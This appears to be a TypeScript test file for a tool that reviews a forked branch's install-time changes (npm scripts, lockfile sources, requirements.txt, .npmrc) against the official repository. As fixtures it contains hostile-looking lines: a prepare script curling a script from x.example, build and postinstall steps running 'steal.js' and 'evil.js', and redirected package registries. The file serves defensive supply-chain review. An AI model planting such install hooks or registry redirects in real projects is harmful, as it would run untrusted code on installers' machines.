import assert from 'node:assert/strict'
import { mkdirSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { after, afterEach, before, describe, it } from 'node:test'
import { changesOf, filesRun, reviewInstall, scriptsRun } from './install-changes'
import { cleanup, tempDir, useUserData } from './testing'

const realFetch = globalThis.fetch
let data: string
let work: string

before(() => {
  data = useUserData()
  work = tempDir('trymydev-install-')
})
afterEach(() => {
  globalThis.fetch = realFetch
})
after(() => cleanup(data, work))

const pkg = (scripts: Record<string, string>, dependencies: Record<string, string> = {}): string =>
  JSON.stringify({ name: 'app', scripts, dependencies })

describe('changesOf', () => {
  it('names the scripts and dependencies a branch adds or changes', () => {
    const official = pkg({ build: 'vite build', postinstall: 'electron-builder install-app-deps' }, { react: '^18.0.0' })
    const branch = pkg(
      { build: 'vite build', postinstall: 'node scripts/setup.js', prepare: 'curl https://x.example/run.sh' },
      { react: '^19.0.0', leftpad: '1.0.0' }
    )
    assert.deepEqual(changesOf('package.json', official, branch), [
      'script "postinstall" now runs: node scripts/setup.js',
      'script "prepare" added: curl https://x.example/run.sh',
      'dependency react: ^18.0.0 → ^19.0.0',
      'dependency leftpad added: 1.0.0'
    ])
    assert.deepEqual(changesOf('package.json', official, official), [])
    assert.deepEqual(changesOf('package.json', official, `${official}\n`), [], 'formatting is no change')
  })

  it('counts only the scripts that run: npm install\'s own, and those the commands name', () => {
    const run = scriptsRun(['npm install', 'npm run build', 'launch the Electron application'])
    assert.ok(run.includes('postinstall') && run.includes('prebuild') && run.includes('build') && run.includes('postbuild'))
    assert.ok(!run.includes('test'))
    const official = pkg({ build: 'vite build', test: 'node --test' })
    const branch = pkg({ build: 'vite build && node steal.js', test: 'node --test a.js', lint: 'eslint .' })
    assert.deepEqual(changesOf('package.json', official, branch, run), [
      'script "build" now runs: vite build && node steal.js',
      '2 other script(s) changed — not run by these commands'
    ])
  })

  it('finds the project scripts the install and build commands run, never the start', () => {
    assert.deepEqual(
      filesRun([
        'npm install',
        'node scripts/download-python-embed.js',
        'python setup.py    (in api)',
        'node ../outside.js',
        'node -e "x"',
        'node main.js'
      ]),
      ['scripts/download-python-embed.js', 'api/setup.py']
    )
  })

  it('names packages a lockfile fetches from outside the npm registry, and only new ones', () => {
    const lock = (resolved: Record<string, string>): string =>
      JSON.stringify({ lockfileVersion: 3, packages: Object.fromEntries(Object.entries(resolved).map(([n, r]) => [`node_modules/${n}`, { resolved: r }])) })
    const official = lock({ react: 'https://registry.npmjs.org/react/-/react-18.0.0.tgz', fork: 'git+ssh://git@github.com/a/fork.git' })
    const branch = lock({
      react: 'https://registry.npmjs.org/react/-/react-19.0.0.tgz',
      fork: 'git+ssh://git@github.com/a/fork.git',
      evil: 'https://x.example/evil-1.0.0.tgz'
    })
    assert.deepEqual(changesOf('package-lock.json', official, branch), [
      'package evil fetched from outside the npm registry: https://x.example/evil-1.0.0.tgz'
    ])
  })

  it('shows the lines a text file adds, and how many it removes', () => {
    assert.deepEqual(changesOf('requirements.txt', 'torch\n# pinned\nnumpy==1.26\n', 'torch\nnumpy==2.0\n--extra-index-url https://x.example/simple\n'), [
      '+ numpy==2.0',
      '+ --extra-index-url https://x.example/simple',
      '1 line(s) removed'
    ])
    assert.deepEqual(changesOf('.npmrc', undefined, 'registry=https://x.example/\n'), ['+ registry=https://x.example/'])
    assert.deepEqual(changesOf('setup.py', 'x', undefined), [], 'absent from the branch: nothing runs')
  })

  it('keeps a long list short', () => {
    const lines = Array.from({ length: 20 }, (_, i) => `pkg${i}==1`).join('\n')
    const shown = changesOf('requirements.txt', '', lines)
    assert.equal(shown.length, 13)
    assert.equal(shown.at(-1), '… and 8 more')
  })
})

describe('reviewInstall', () => {
  it('compares the checkout with the official default branch through raw.githubusercontent.com', async () => {
    const checkout = join(work, 'fork')
    mkdirSync(join(checkout, 'api'), { recursive: true })
    writeFileSync(join(checkout, 'package.json'), pkg({ postinstall: 'node evil.js' }))
    writeFileSync(join(checkout, 'api', 'requirements.txt'), 'torch\n')
    writeFileSync(join(checkout, '.npmrc'), 'registry=https://x.example/\n')
    const asked: string[] = []
    globalThis.fetch = (async (input: string | URL | Request) => {
      const url = String(input)
      asked.push(url)
      if (url === 'https://raw.githubusercontent.com/owner/app/HEAD/package.json') return new Response(pkg({}))
      if (url === 'https://raw.githubusercontent.com/owner/app/HEAD/api/requirements.txt') return new Response('torch\n')
      return new Response('404: Not Found', { status: 404 })
    }) as typeof fetch

    const review = await reviewInstall(checkout, 'owner/app')
    assert.equal(review.against, 'owner/app')
    assert.equal(review.unavailable, undefined)
    assert.deepEqual(review.changes, [
      { file: 'package.json', added: false, lines: ['script "postinstall" added: node evil.js'] },
      { file: '.npmrc', added: true, lines: ['+ registry=https://x.example/'] }
    ])
    assert.equal(asked.length, 3, 'only the files the branch has')
  })

  it('says when GitHub cannot be asked, without failing', async () => {
    const checkout = join(work, 'offline')
    mkdirSync(checkout, { recursive: true })
    writeFileSync(join(checkout, 'package.json'), pkg({}))
    globalThis.fetch = (async () => new Response('down', { status: 503 })) as typeof fetch
    const review = await reviewInstall(checkout, 'owner/app')
    assert.deepEqual(review.changes, [])
    assert.match(review.unavailable ?? '', /503/)
  })
})
